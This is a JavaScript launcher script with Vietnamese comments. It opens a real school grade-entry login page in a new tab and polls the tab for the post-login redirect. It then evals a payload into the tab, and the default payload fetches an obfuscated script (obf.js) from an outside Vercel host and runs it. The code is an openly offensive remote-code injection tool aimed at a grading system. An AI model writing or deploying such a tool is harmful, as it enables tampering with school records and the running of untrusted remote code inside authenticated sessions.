// ============================================================
// NT4NH2 // LAUNCHER SCRIPT (WINDOW OPEN + URL POLLING)
// Chạy trên tab thật để không bị lỗi Loading/Cross-Origin
// ============================================================

const DEFAULT_CONFIG = {
  targetUrl: "https://nhapdiem.truonghocviet.vn/Account/Login",
  payload: "fetch('https://vschoolx.vercel.app/files/obf.js').then(r => r.text()).then(eval);",
  delay: 2500,
  title: "Launcher Tool",
  bg: "#0d1117",
  text: "#c9d1d9"
};

function loadConfig() {
  const raw = localStorage.getItem("launcher_config");
  if (!raw) return { ...DEFAULT_CONFIG };
  try { return { ...DEFAULT_CONFIG, ...JSON.parse(raw) }; }
  catch (e) { return { ...DEFAULT_CONFIG }; }
}

function saveConfig(cfg) {
  localStorage.setItem("launcher_config", JSON.stringify(cfg));
}

let CONFIG = loadConfig();

function applyWebSettings() {
  document.title = CONFIG.title;
  document.body.style.background = CONFIG.bg;
  document.body.style.color = CONFIG.text;
}

const btnLaunch     = document.getElementById("btnLaunch");
const btnSettingTool= document.getElementById("btnSettingTool");
const btnSettingWeb = document.getElementById("btnSettingWeb");
const statusEl      = document.getElementById("status");

const popup         = document.getElementById("popup");
const btnReinject   = document.getElementById("btnReinject");
const btnInjectNext = document.getElementById("btnInjectNext"); // Nút mới
const btnClose      = document.getElementById("btnClose");

const settingTool   = document.getElementById("settingTool");
const inpTargetUrl  = document.getElementById("inpTargetUrl");
const inpPayload    = document.getElementById("inpPayload");
const inpDelay      = document.getElementById("inpDelay");
const btnSaveTool   = document.getElementById("btnSaveTool");
const btnCloseTool  = document.getElementById("btnCloseTool");

const settingWeb    = document.getElementById("settingWeb");
const inpTitle      = document.getElementById("inpTitle");
const inpBg         = document.getElementById("inpBg");
const inpText       = document.getElementById("inpText");
const btnSaveWeb    = document.getElementById("btnSaveWeb");
const btnCloseWeb   = document.getElementById("btnCloseWeb");

let toolWindow = null;
let watchTimer = null;
let popupShown = false;

function setStatus(msg) {
  statusEl.textContent = "Trạng thái: " + msg;
}

// Hàm mở tab và inject
function launchTool() {
  popupShown = false;
  setStatus("Đang mở tab đích...");

  // Nếu đã có tab mở, đóng tab cũ trước khi mở tab mới
  if (toolWindow && !toolWindow.closed) {
    toolWindow.close();
  }

  // Mở tab mới (phải được kích hoạt bởi hành động click của user)
  toolWindow = window.open(CONFIG.targetUrl, "_blank");

  if (!toolWindow) {
    setStatus("Popup bị chặn. Vui lòng cho phép popup!");
    return;
  }

  setStatus("Đang chờ trang tải xong...");
  startWatch();
}

// Kỹ thuật Inject vào Tab thật
function performInject() {
  if (!toolWindow || toolWindow.closed) return;
  
  try {
    // Inject qua eval vào window của tab mới
    toolWindow.eval(CONFIG.payload);
    setStatus("Đã gửi lệnh Inject vào tab đích. Hãy kiểm tra tab đó.");
  } catch (e) {
    // Nếu lỗi CORS (thường gặp khi chạy từ domain khác)
    console.error("Lỗi Inject:", e);
    setStatus("Lỗi CORS: Không thể inject trực tiếp. Cần dùng Extension.");
  }
}

// Giám sát tab (Tool bị đóng hoặc cần chuyển trang)
function startWatch() {
  stopWatch();
  let lastUrl = "";

  watchTimer = setInterval(() => {
    if (!toolWindow || toolWindow.closed) {
      stopWatch();
      onToolClosed();
      return;
    }

    try {
      // Cố gắng lấy URL hiện tại (có thể bị lỗi CORS, bỏ qua nếu lỗi)
      const currentUrl = toolWindow.location.href;
      
      // Nếu URL thay đổi (người dùng đã đăng nhập thành công và bị redirect)
      if (lastUrl && currentUrl !== lastUrl && currentUrl !== CONFIG.targetUrl) {
        setStatus("Phát hiện chuyển trang. Đang chờ inject trang sau...");
        // Tự động inject nếu có thể, hoặc bật popup
        setTimeout(() => {
          performInject();
          setStatus("Đã inject trang sau thành công.");
        }, 1000);
      }
      lastUrl = currentUrl;
      
    } catch (e) {
      // Lỗi CORS khi cố đọc URL -> Bỏ qua, chỉ kiểm tra tab còn mở không
    }
  }, 1000);
}

function stopWatch() {
  if (watchTimer) { clearInterval(watchTimer); watchTimer = null; }
}

function onToolClosed() {
  setStatus("Tab đích đã đóng.");
  if (!popupShown) {
    popupShown = true;
    popup.classList.remove("hidden");
  }
}

// Gắn sự kiện
btnLaunch.addEventListener("click", launchTool);

// Bấm nút Inject lại từ Popup
btnReinject.addEventListener("click", () => {
  popup.classList.add("hidden");
  launchTool();
});

// Bấm nút Inject trang sau (Sau khi đã đăng nhập)
btnInjectNext.addEventListener("click", () => {
  popup.classList.add("hidden");
  if (toolWindow && !toolWindow.closed) {
    setStatus("Đang inject vào trang sau...");
    performInject();
  } else {
    setStatus("Tab đã đóng, hãy bấm Launch lại.");
  }
});

btnSettingTool.addEventListener("click", () => {
  inpTargetUrl.value = CONFIG.targetUrl;
  inpPayload.value   = CONFIG.payload;
  inpDelay.value     = CONFIG.delay;
  settingTool.classList.remove("hidden");
});

btnSettingWeb.addEventListener("click", () => {
  inpTitle.value = CONFIG.title;
  inpBg.value    = CONFIG.bg;
  inpText.value  = CONFIG.text;
  settingWeb.classList.remove("hidden");
});

btnSaveTool.addEventListener("click", () => {
  CONFIG.targetUrl = inpTargetUrl.value.trim();
  CONFIG.payload   = inpPayload.value.trim();
  CONFIG.delay     = parseInt(inpDelay.value) || 2500;
  saveConfig(CONFIG);
  settingTool.classList.add("hidden");
  setStatus("Đã lưu setting tool.");
});

btnSaveWeb.addEventListener("click", () => {
  CONFIG.title = inpTitle.value.trim() || "Launcher Tool";
  CONFIG.bg    = inpBg.value;
  CONFIG.text  = inpText.value;
  saveConfig(CONFIG);
  applyWebSettings();
  settingWeb.classList.add("hidden");
  setStatus("Đã lưu setting web.");
});

btnCloseTool.addEventListener("click", () => settingTool.classList.add("hidden"));
btnCloseWeb .addEventListener("click", () => settingWeb.classList.add("hidden"));

btnClose.addEventListener("click", () => {
  popup.classList.add("hidden");
  setStatus("Đã hủy.");
});

applyWebSettings();
setStatus("Sẵn sàng.");
